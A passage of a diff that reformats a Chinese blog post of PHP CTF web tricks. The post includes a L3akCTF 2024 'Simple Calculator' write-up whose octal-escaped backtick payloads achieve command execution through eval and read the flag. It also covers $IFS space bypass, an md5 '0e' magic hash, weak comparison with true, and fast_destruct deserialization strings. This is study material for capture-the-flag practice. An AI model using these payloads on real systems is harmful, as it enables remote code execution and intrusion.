-</span></span><span style="display:flex;"><span>$result <span style="color:#f92672">=</span> <span style="color:#a6e22e">popCalc</span>();
-</span></span><span style="display:flex;"><span><span style="color:#66d9ef">echo</span> <span style="color:#e6db74">&#34;Result: &#34;</span> <span style="color:#f92672">.</span> $result;
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span><span style="color:#75715e">?&gt;</span><span style="color:#960050;background-color:#1e0010">
-</span></span></span></code></pre></div><p>$formula是个可控的变量，不允许长度超过150，同时字符串中不能出现字母和大小写引号</p>
-<p>本题的bypass运用到了如下的两个特性：</p>
-<p>1.PHP中反引号中的内容会被作为shell 命令来执行，并将其输出信息返回</p>
-<p>2.PHP中\ddd表示的是1~3位八进制ASCII值对应字符</p>
-<pre tabindex="0"><code>ls对应payload为?formula=`\154\163`
+</code></pre><p>一次md5后是0e开头：</p><pre tabindex=0><code>240610708
+</code></pre><h2 id=空格绕过>空格绕过<a hidden class=anchor aria-hidden=true href=#空格绕过>#</a></h2><p>对于执行shell命令的环境往往会过滤空格，但是由于shell本身的特性，导致出现一些bypass，如<code>$IFS</code>等，常见绕过原理如下：
+<code>$IFS</code>是shell中的字段分隔符，默认值为 空格、Tab、换行</p><h2 id=php反引号八进制dxxx实现rce>php反引号+八进制\dxxx实现RCE<a hidden class=anchor aria-hidden=true href=#php反引号八进制dxxx实现rce>#</a></h2><p>Simple Calculator [L3akCTF 2024]</p><p>题目给了index.php的源码：</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-php data-lang=php><span style=display:flex><span><span style=color:#f92672>&lt;?</span><span style=color:#a6e22e>php</span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#66d9ef>function</span> <span style=color:#a6e22e>popCalc</span>() {
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>if</span> (<span style=color:#a6e22e>isset</span>($_GET[<span style=color:#e6db74>&#39;formula&#39;</span>])) {
+</span></span><span style=display:flex><span>        $formula <span style=color:#f92672>=</span> $_GET[<span style=color:#e6db74>&#39;formula&#39;</span>];
+</span></span><span style=display:flex><span>        <span style=color:#66d9ef>if</span> (<span style=color:#a6e22e>strlen</span>($formula) <span style=color:#f92672>&gt;=</span> <span style=color:#ae81ff>150</span> <span style=color:#f92672>||</span> <span style=color:#a6e22e>preg_match</span>(<span style=color:#e6db74>&#39;/[a-z\&#39;&#34;]+/i&#39;</span>, $formula)) {
+</span></span><span style=display:flex><span>            <span style=color:#66d9ef>return</span> <span style=color:#e6db74>&#39;Try Harder !&#39;</span>;
+</span></span><span style=display:flex><span>        }
+</span></span><span style=display:flex><span>        <span style=color:#66d9ef>try</span> {
+</span></span><span style=display:flex><span>            <span style=color:#66d9ef>eval</span>(<span style=color:#e6db74>&#39;$calc = &#39;</span> <span style=color:#f92672>.</span> $formula <span style=color:#f92672>.</span> <span style=color:#e6db74>&#39;;&#39;</span>);
+</span></span><span style=display:flex><span>            <span style=color:#66d9ef>return</span> <span style=color:#a6e22e>isset</span>($calc) <span style=color:#f92672>?</span> $calc <span style=color:#f92672>:</span> <span style=color:#e6db74>&#39;?&#39;</span>;
+</span></span><span style=display:flex><span>        } <span style=color:#66d9ef>catch</span> (<span style=color:#a6e22e>ParseError</span> $err) {
+</span></span><span style=display:flex><span>            <span style=color:#66d9ef>return</span> <span style=color:#e6db74>&#39;Error&#39;</span>;
+</span></span><span style=display:flex><span>        }
+</span></span><span style=display:flex><span>    }
+</span></span><span style=display:flex><span>}
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>$result <span style=color:#f92672>=</span> <span style=color:#a6e22e>popCalc</span>();
+</span></span><span style=display:flex><span><span style=color:#66d9ef>echo</span> <span style=color:#e6db74>&#34;Result: &#34;</span> <span style=color:#f92672>.</span> $result;
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#75715e>?&gt;</span><span style=color:#960050;background-color:#1e0010>
+</span></span></span></code></pre></div><p>$formula是个可控的变量，不允许长度超过150，同时字符串中不能出现字母和大小写引号</p><p>本题的bypass运用到了如下的两个特性：</p><p>1.PHP中反引号中的内容会被作为shell 命令来执行，并将其输出信息返回</p><p>2.PHP中\ddd表示的是1~3位八进制ASCII值对应字符</p><pre tabindex=0><code>ls对应payload为?formula=`\154\163`
 Result: flag-YQUO4fGlBZhRt3qZAg9Xnneyunqm5kmiP6CvM2JafYJ9alzgOTWYp3lNxTsaZlhd.txt
 index.php
 
 cat f*对应payload为?formula=`\143\141\164\40\146\52`
 Result: L3AK{PhP_Web_Ch@ll3ng3}
-</code></pre><h2 id="true在弱比较时的特性">true在弱比较时的特性<a hidden class="anchor" aria-hidden="true" href="#true在弱比较时的特性">#</a></h2>
-<p>除了空对象以外，目前只发现0值以及其他类型空值与true进行弱比较会判断为false：</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#f92672">&lt;?</span><span style="color:#a6e22e">php</span>
-</span></span><span style="display:flex;"><span>$emptyArr <span style="color:#f92672">=</span> <span style="color:#66d9ef">array</span>();
-</span></span><span style="display:flex;"><span>$emptystr <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;&#34;</span>;
-</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> (<span style="color:#66d9ef">true</span> <span style="color:#f92672">==</span> <span style="color:#ae81ff">0</span> <span style="color:#f92672">||</span> <span style="color:#66d9ef">true</span> <span style="color:#f92672">==</span> <span style="color:#66d9ef">null</span> <span style="color:#f92672">||</span> <span style="color:#66d9ef">true</span> <span style="color:#f92672">==</span> $emptyArr <span style="color:#f92672">||</span> <span style="color:#66d9ef">true</span> <span style="color:#f92672">==</span> $emptyStr <span style="color:#f92672">||</span> <span style="color:#66d9ef">true</span> <span style="color:#f92672">==</span> <span style="color:#66d9ef">false</span>){
-</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">echo</span> <span style="color:#e6db74">&#34;impossible&#34;</span>;
-</span></span><span style="display:flex;"><span>}
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span><span style="color:#66d9ef">class</span> <span style="color:#a6e22e">A</span> {
-</span></span><span style="display:flex;"><span>}
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>$obj <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> <span style="color:#a6e22e">A</span>();
-</span></span><span style="display:flex;"><span>$arr <span style="color:#f92672">=</span> <span style="color:#66d9ef">array</span>(<span style="color:#e6db74">&#39;&#39;</span>);
-</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> (<span style="color:#66d9ef">true</span> <span style="color:#f92672">==</span> <span style="color:#ae81ff">114514</span> <span style="color:#f92672">&amp;&amp;</span> <span style="color:#66d9ef">true</span> <span style="color:#f92672">==</span> <span style="color:#ae81ff">0.1</span> <span style="color:#f92672">&amp;&amp;</span> <span style="color:#66d9ef">true</span> <span style="color:#f92672">==</span> $obj <span style="color:#f92672">&amp;&amp;</span> <span style="color:#66d9ef">true</span> <span style="color:#f92672">==</span> $arr <span style="color:#f92672">&amp;&amp;</span> <span style="color:#66d9ef">true</span> <span style="color:#f92672">==</span> <span style="color:#e6db74">&#34;a&#34;</span> <span style="color:#f92672">&amp;&amp;</span> <span style="color:#66d9ef">true</span> <span style="color:#f92672">==</span> <span style="color:#66d9ef">true</span> ) {
-</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">echo</span> <span style="color:#e6db74">&#34;true&#34;</span>;
-</span></span><span style="display:flex;"><span>}
-</span></span><span style="display:flex;"><span><span style="color:#75715e">?&gt;</span><span style="color:#960050;background-color:#1e0010">
-</span></span></span></code></pre></div><h2 id="反序列化中-fast_destruct-绕过-throw">反序列化中 fast_destruct 绕过 throw<a hidden class="anchor" aria-hidden="true" href="#反序列化中-fast_destruct-绕过-throw">#</a></h2>
-<p>如果在程序结束销毁所有对象之前有throw抛出异常，则无法实现__destruct()函数的触发：</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#f92672">&lt;?</span><span style="color:#a6e22e">php</span>
-</span></span><span style="display:flex;"><span><span style="color:#66d9ef">class</span> <span style="color:#a6e22e">User</span>
-</span></span><span style="display:flex;"><span>{
-</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">public</span> $username <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;sxc&#34;</span>;
-</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">public</span> $age <span style="color:#f92672">=</span> <span style="color:#ae81ff">258</span>;
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">public</span> <span style="color:#66d9ef">function</span> <span style="color:#a6e22e">__destruct</span>() {
-</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">print</span>(<span style="color:#e6db74">&#34;successfully bypass throw&#34;</span>);
-</span></span><span style="display:flex;"><span>    }
-</span></span><span style="display:flex;"><span>}
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span><span style="color:#75715e">// $a = new User();
-</span></span></span><span style="display:flex;"><span><span style="color:#75715e">// $ser = serialize($a);
-</span></span></span><span style="display:flex;"><span><span style="color:#75715e">// print($ser);     # O:4:&#34;User&#34;:2:{s:8:&#34;username&#34;;s:3:&#34;sxc&#34;;s:3:&#34;age&#34;;i:258;}
-</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>$ser <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;O:4:&#34;User&#34;:2:{s:8:&#34;username&#34;;s:3:&#34;sxc&#34;;s:3:&#34;age&#34;;i:258;}&#39;</span>;
-</span></span><span style="display:flex;"><span>$unser <span style="color:#f92672">=</span> <span style="color:#a6e22e">unserialize</span>($ser);
-</span></span><span style="display:flex;"><span><span style="color:#66d9ef">throw</span> <span style="color:#66d9ef">new</span> <span style="color:#a6e22e">Exception</span>(<span style="color:#e6db74">&#34;you can&#39;t destruct&#34;</span>);
-</span></span></code></pre></div><p>这个程序只会抛出异常，而不会执行__destruct()</p>
-<p>要绕过这个throw需要利用php的fast_destruct特性：</p>
-<pre tabindex="0"><code>方式一，删去末尾一个花括号}：$ser = &#39;O:4:&#34;User&#34;:2:{s:8:&#34;username&#34;;s:3:&#34;sxc&#34;;s:3:&#34;age&#34;;i:258;&#39;;
+</code></pre><h2 id=true在弱比较时的特性>true在弱比较时的特性<a hidden class=anchor aria-hidden=true href=#true在弱比较时的特性>#</a></h2><p>除了空对象以外，目前只发现0值以及其他类型空值与true进行弱比较会判断为false：</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-php data-lang=php><span style=display:flex><span><span style=color:#f92672>&lt;?</span><span style=color:#a6e22e>php</span>
+</span></span><span style=display:flex><span>$emptyArr <span style=color:#f92672>=</span> <span style=color:#66d9ef>array</span>();
+</span></span><span style=display:flex><span>$emptystr <span style=color:#f92672>=</span> <span style=color:#e6db74>&#34;&#34;</span>;
+</span></span><span style=display:flex><span><span style=color:#66d9ef>if</span> (<span style=color:#66d9ef>true</span> <span style=color:#f92672>==</span> <span style=color:#ae81ff>0</span> <span style=color:#f92672>||</span> <span style=color:#66d9ef>true</span> <span style=color:#f92672>==</span> <span style=color:#66d9ef>null</span> <span style=color:#f92672>||</span> <span style=color:#66d9ef>true</span> <span style=color:#f92672>==</span> $emptyArr <span style=color:#f92672>||</span> <span style=color:#66d9ef>true</span> <span style=color:#f92672>==</span> $emptyStr <span style=color:#f92672>||</span> <span style=color:#66d9ef>true</span> <span style=color:#f92672>==</span> <span style=color:#66d9ef>false</span>){
+</span></span><span style=display:flex><span>	<span style=color:#66d9ef>echo</span> <span style=color:#e6db74>&#34;impossible&#34;</span>;
+</span></span><span style=display:flex><span>}
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#66d9ef>class</span> <span style=color:#a6e22e>A</span> {
+</span></span><span style=display:flex><span>}
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>$obj <span style=color:#f92672>=</span> <span style=color:#66d9ef>new</span> <span style=color:#a6e22e>A</span>();
+</span></span><span style=display:flex><span>$arr <span style=color:#f92672>=</span> <span style=color:#66d9ef>array</span>(<span style=color:#e6db74>&#39;&#39;</span>);
+</span></span><span style=display:flex><span><span style=color:#66d9ef>if</span> (<span style=color:#66d9ef>true</span> <span style=color:#f92672>==</span> <span style=color:#ae81ff>114514</span> <span style=color:#f92672>&amp;&amp;</span> <span style=color:#66d9ef>true</span> <span style=color:#f92672>==</span> <span style=color:#ae81ff>0.1</span> <span style=color:#f92672>&amp;&amp;</span> <span style=color:#66d9ef>true</span> <span style=color:#f92672>==</span> $obj <span style=color:#f92672>&amp;&amp;</span> <span style=color:#66d9ef>true</span> <span style=color:#f92672>==</span> $arr <span style=color:#f92672>&amp;&amp;</span> <span style=color:#66d9ef>true</span> <span style=color:#f92672>==</span> <span style=color:#e6db74>&#34;a&#34;</span> <span style=color:#f92672>&amp;&amp;</span> <span style=color:#66d9ef>true</span> <span style=color:#f92672>==</span> <span style=color:#66d9ef>true</span> ) {
+</span></span><span style=display:flex><span>	<span style=color:#66d9ef>echo</span> <span style=color:#e6db74>&#34;true&#34;</span>;
+</span></span><span style=display:flex><span>}
+</span></span><span style=display:flex><span><span style=color:#75715e>?&gt;</span><span style=color:#960050;background-color:#1e0010>
+</span></span></span></code></pre></div><h2 id=反序列化中-fast_destruct-绕过-throw>反序列化中 fast_destruct 绕过 throw<a hidden class=anchor aria-hidden=true href=#反序列化中-fast_destruct-绕过-throw>#</a></h2><p>如果在程序结束销毁所有对象之前有throw抛出异常，则无法实现__destruct()函数的触发：</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-php data-lang=php><span style=display:flex><span><span style=color:#f92672>&lt;?</span><span style=color:#a6e22e>php</span>
+</span></span><span style=display:flex><span><span style=color:#66d9ef>class</span> <span style=color:#a6e22e>User</span>
+</span></span><span style=display:flex><span>{
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>public</span> $username <span style=color:#f92672>=</span> <span style=color:#e6db74>&#34;sxc&#34;</span>;
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>public</span> $age <span style=color:#f92672>=</span> <span style=color:#ae81ff>258</span>;
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>public</span> <span style=color:#66d9ef>function</span> <span style=color:#a6e22e>__destruct</span>() {
+</span></span><span style=display:flex><span>        <span style=color:#66d9ef>print</span>(<span style=color:#e6db74>&#34;successfully bypass throw&#34;</span>);
+</span></span><span style=display:flex><span>    }
+</span></span><span style=display:flex><span>}
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#75715e>// $a = new User();
+</span></span></span><span style=display:flex><span><span style=color:#75715e>// $ser = serialize($a);
+</span></span></span><span style=display:flex><span><span style=color:#75715e>// print($ser);     # O:4:&#34;User&#34;:2:{s:8:&#34;username&#34;;s:3:&#34;sxc&#34;;s:3:&#34;age&#34;;i:258;}
+</span></span></span><span style=display:flex><span><span style=color:#75715e></span>$ser <span style=color:#f92672>=</span> <span style=color:#e6db74>&#39;O:4:&#34;User&#34;:2:{s:8:&#34;username&#34;;s:3:&#34;sxc&#34;;s:3:&#34;age&#34;;i:258;}&#39;</span>;
+</span></span><span style=display:flex><span>$unser <span style=color:#f92672>=</span> <span style=color:#a6e22e>unserialize</span>($ser);
+</span></span><span style=display:flex><span><span style=color:#66d9ef>throw</span> <span style=color:#66d9ef>new</span> <span style=color:#a6e22e>Exception</span>(<span style=color:#e6db74>&#34;you can&#39;t destruct&#34;</span>);
+</span></span></code></pre></div><p>这个程序只会抛出异常，而不会执行__destruct()</p><p>要绕过这个throw需要利用php的fast_destruct特性：</p><pre tabindex=0><code>方式一，删去末尾一个花括号}：$ser = &#39;O:4:&#34;User&#34;:2:{s:8:&#34;username&#34;;s:3:&#34;sxc&#34;;s:3:&#34;age&#34;;i:258;&#39;;
 方式二，修改序列化数字元素个数，将User后的2改为其他值：$ser = &#39;O:4:&#34;User&#34;:3:{s:8:&#34;username&#34;;s:3:&#34;sxc&#34;;s:3:&#34;age&#34;;i:258;}&#39;;
 方式三，先构造形如array($a, 0)的数组，再将最后的i:1改为i:0：$ser = &#39;a:2:{i:0;O:4:&#34;User&#34;:2:{s:8:&#34;username&#34;;s:3:&#34;sxc&#34;;s:3:&#34;age&#34;;i:258;}i:0;i:0;}&#39;;
-</code></pre><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#f92672">&lt;?</span><span style="color:#a6e22e">php</span>
-</span></span><span style="display:flex;"><span><span style="color:#66d9ef">class</span> <span style="color:#a6e22e">User</span>
-</span></span><span style="display:flex;"><span>{
-</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">public</span> $username <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;sxc&#34;</span>;
-</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">public</span> $age <span style="color:#f92672">=</span> <span style="color:#ae81ff">258</span>;
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">public</span> <span style="color:#66d9ef">function</span> <span style="color:#a6e22e">__destruct</span>() {
-</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">print</span>(<span style="color:#e6db74">&#34;successfully bypass throw&#34;</span>);
-</span></span><span style="display:flex;"><span>    }
-</span></span><span style="display:flex;"><span>}
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span><span style="color:#75715e">// $a = new User();
-</span></span></span><span style="display:flex;"><span><span style="color:#75715e">// $ser = serialize($a);
-</span></span></span><span style="display:flex;"><span><span style="color:#75715e">// print($ser);     # O:4:&#34;User&#34;:2:{s:8:&#34;username&#34;;s:3:&#34;sxc&#34;;s:3:&#34;age&#34;;i:258;}
-</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
-</span></span><span style="display:flex;"><span><span style="color:#75715e">// $a = new User();
-</span></span></span><span style="display:flex;"><span><span style="color:#75715e">// $ser = serialize(array($a,0));
-</span></span></span><span style="display:flex;"><span><span style="color:#75715e">// print($ser);     # a:2:{i:0;O:4:&#34;User&#34;:2:{s:8:&#34;username&#34;;s:3:&#34;sxc&#34;;s:3:&#34;age&#34;;i:258;}i:1;i:0;}
-</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
-</span></span><span style="display:flex;"><span><span style="color:#75715e"># $ser = &#39;a:2:{i:0;O:4:&#34;User&#34;:2:{s:8:&#34;username&#34;;s:3:&#34;sxc&#34;;s:3:&#34;age&#34;;i:258;}i:0;i:0;}&#39;;
-</span></span></span><span style="display:flex;"><span><span style="color:#75715e"># $ser = &#39;O:4:&#34;User&#34;:2:{s:8:&#34;username&#34;;s:3:&#34;sxc&#34;;s:3:&#34;age&#34;;i:258;&#39;;
-</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>$ser <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;O:4:&#34;User&#34;:3:{s:8:&#34;username&#34;;s:3:&#34;sxc&#34;;s:3:&#34;age&#34;;i:258;}&#39;</span>;
-</span></span><span style="display:flex;"><span>$user <span style="color:#f92672">=</span> <span style="color:#a6e22e">unserialize</span>($ser);
-</span></span><span style="display:flex;"><span><span style="color:#66d9ef">throw</span> <span style="color:#66d9ef">new</span> <span style="color:#a6e22e">Exception</span>(<span style="color:#e6db74">&#34;you can&#39;t destruct&#34;</span>);
-</span></span><span style="display:flex;"><span><span style="color:#75715e">?&gt;</span><span style="color:#960050;background-color:#1e0010">
+</code></pre><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-php data-lang=php><span style=display:flex><span><span style=color:#f92672>&lt;?</span><span style=color:#a6e22e>php</span>
+</span></span><span style=display:flex><span><span style=color:#66d9ef>class</span> <span style=color:#a6e22e>User</span>
+</span></span><span style=display:flex><span>{
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>public</span> $username <span style=color:#f92672>=</span> <span style=color:#e6db74>&#34;sxc&#34;</span>;
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>public</span> $age <span style=color:#f92672>=</span> <span style=color:#ae81ff>258</span>;
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>public</span> <span style=color:#66d9ef>function</span> <span style=color:#a6e22e>__destruct</span>() {
+</span></span><span style=display:flex><span>        <span style=color:#66d9ef>print</span>(<span style=color:#e6db74>&#34;successfully bypass throw&#34;</span>);
+</span></span><span style=display:flex><span>    }
+</span></span><span style=display:flex><span>}
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#75715e>// $a = new User();
+</span></span></span><span style=display:flex><span><span style=color:#75715e>// $ser = serialize($a);
+</span></span></span><span style=display:flex><span><span style=color:#75715e>// print($ser);     # O:4:&#34;User&#34;:2:{s:8:&#34;username&#34;;s:3:&#34;sxc&#34;;s:3:&#34;age&#34;;i:258;}
+</span></span></span><span style=display:flex><span><span style=color:#75715e></span>
+</span></span><span style=display:flex><span><span style=color:#75715e>// $a = new User();
+</span></span></span><span style=display:flex><span><span style=color:#75715e>// $ser = serialize(array($a,0));
+</span></span></span><span style=display:flex><span><span style=color:#75715e>// print($ser);     # a:2:{i:0;O:4:&#34;User&#34;:2:{s:8:&#34;username&#34;;s:3:&#34;sxc&#34;;s:3:&#34;age&#34;;i:258;}i:1;i:0;}
+</span></span></span><span style=display:flex><span><span style=color:#75715e></span>
+</span></span><span style=display:flex><span><span style=color:#75715e># $ser = &#39;a:2:{i:0;O:4:&#34;User&#34;:2:{s:8:&#34;username&#34;;s:3:&#34;sxc&#34;;s:3:&#34;age&#34;;i:258;}i:0;i:0;}&#39;;
+</span></span></span><span style=display:flex><span><span style=color:#75715e># $ser = &#39;O:4:&#34;User&#34;:2:{s:8:&#34;username&#34;;s:3:&#34;sxc&#34;;s:3:&#34;age&#34;;i:258;&#39;;
+</span></span></span><span style=display:flex><span><span style=color:#75715e></span>$ser <span style=color:#f92672>=</span> <span style=color:#e6db74>&#39;O:4:&#34;User&#34;:3:{s:8:&#34;username&#34;;s:3:&#34;sxc&#34;;s:3:&#34;age&#34;;i:258;}&#39;</span>;
+</span></span><span style=display:flex><span>$user <span style=color:#f92672>=</span> <span style=color:#a6e22e>unserialize</span>($ser);
+</span></span><span style=display:flex><span><span style=color:#66d9ef>throw</span> <span style=color:#66d9ef>new</span> <span style=color:#a6e22e>Exception</span>(<span style=color:#e6db74>&#34;you can&#39;t destruct&#34;</span>);
+</span></span><span style=display:flex><span><span style=color:#75715e>?&gt;</span><span style=color:#960050;background-color:#1e0010>
 </span></span></span></code></pre></div><p>参考资料：
-<a href="https://zhuanlan.zhihu.com/p/405838002">https://zhuanlan.zhihu.com/p/405838002</a></p>
-<hr>
-
-
-  </div>
-
-  <footer class="post-footer">
-    <ul class="post-tags">
-    </ul>
-  </footer>
-</article>
-    </main>
-    
-<footer class="footer">
-        <span>&copy; 2025 <a href="https://z9nn8w.github.io/">w8nn9z Blog</a></span> · 
-
-    <span>
-        Powered by
-        <a href="https://gohugo.io/" rel="noopener noreferrer" target="_blank">Hugo</a> &
-        <a href="https://github.com/adityatelange/hugo-PaperMod/" rel="noopener" target="_blank">PaperMod</a>
-    </span>
-</footer>
-<a href="#top" aria-label="go to top" title="Go to Top (Alt + G)" class="top-link" id="top-link" accesskey="g">
-    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 12 6" fill="currentColor">
-        <path d="M12 6H0l6-6z" />
-    </svg>
-</a>
-
-<script>
-    let menu = document.getElementById('menu')
-    if (menu) {
-        menu.scrollLeft = localStorage.getItem("menu-scroll-position");
-        menu.onscroll = function () {
-            localStorage.setItem("menu-scroll-position", menu.scrollLeft);
-        }
-    }
-
-    document.querySelectorAll('a[href^="#"]').forEach(anchor => {
-        anchor.addEventListener("click", function (e) {
-            e.preventDefault();
-            var id = this.getAttribute("href").substr(1);
-            if (!window.matchMedia('(prefers-reduced-motion: reduce)').matches) {
-                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView({
-                    behavior: "smooth"
-                });
-            } else {
-                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView();
-            }
-            if (id === "top") {
-                history.replaceState(null, null, " ");
-            } else {
-                history.pushState(null, null, `#${id}`);
-            }
-        });
-    });
-
-</script>
-<script>
-    var mybutton = document.getElementById("top-link");
-    window.onscroll = function () {
-        if (document.body.scrollTop > 800 || document.documentElement.scrollTop > 800) {
-            mybutton.style.visibility = "visible";
-            mybutton.style.opacity = "1";
-        } else {
-            mybutton.style.visibility = "hidden";
-            mybutton.style.opacity = "0";
-        }
-    };
-
-</script>
-<script>
-    document.getElementById("theme-toggle").addEventListener("click", () => {
-        if (document.body.className.includes("dark")) {
-            document.body.classList.remove('dark');
-            localStorage.setItem("pref-theme", 'light');
-        } else {
-            document.body.classList.add('dark');
-            localStorage.setItem("pref-theme", 'dark');
-        }
-    })
-
-</script>
-</body>
-
-</html>
+<a href=https://zhuanlan.zhihu.com/p/405838002>https://zhuanlan.zhihu.com/p/405838002</a></p><hr></div><footer class=post-footer><ul class=post-tags></ul></footer></article></main><footer class=footer><span>&copy; 2025 <a href=https://z9nn8w.github.io/>w8nn9z Blog</a></span> ·
+<span>Powered by
+<a href=https://gohugo.io/ rel="noopener noreferrer" target=_blank>Hugo</a> &
+<a href=https://github.com/adityatelange/hugo-PaperMod/ rel=noopener target=_blank>PaperMod</a></span></footer><a href=#top aria-label="go to top" title="Go to Top (Alt + G)" class=top-link id=top-link accesskey=g><svg viewBox="0 0 12 6" fill="currentColor"><path d="M12 6H0l6-6z"/></svg>
+</a><script>let menu=document.getElementById("menu");menu&&(menu.scrollLeft=localStorage.getItem("menu-scroll-position"),menu.onscroll=function(){localStorage.setItem("menu-scroll-position",menu.scrollLeft)}),document.querySelectorAll('a[href^="#"]').forEach(e=>{e.addEventListener("click",function(e){e.preventDefault();var t=this.getAttribute("href").substr(1);window.matchMedia("(prefers-reduced-motion: reduce)").matches?document.querySelector(`[id='${decodeURIComponent(t)}']`).scrollIntoView():document.querySelector(`[id='${decodeURIComponent(t)}']`).scrollIntoView({behavior:"smooth"}),t==="top"?history.replaceState(null,null," "):history.pushState(null,null,`#${t}`)})})</script><script>var mybutton=document.getElementById("top-link");window.onscroll=function(){document.body.scrollTop>800||document.documentElement.scrollTop>800?(mybutton.style.visibility="visible",mybutton.style.opacity="1"):(mybutton.style.visibility="hidden",mybutton.style.opacity="0")}</script><script>document.getElementById("theme-toggle").addEventListener("click",()=>{document.body.className.includes("dark")?(document.body.classList.remove("dark"),localStorage.setItem("pref-theme","light")):(document.body.classList.add("dark"),localStorage.setItem("pref-theme","dark"))})</script></body></html>
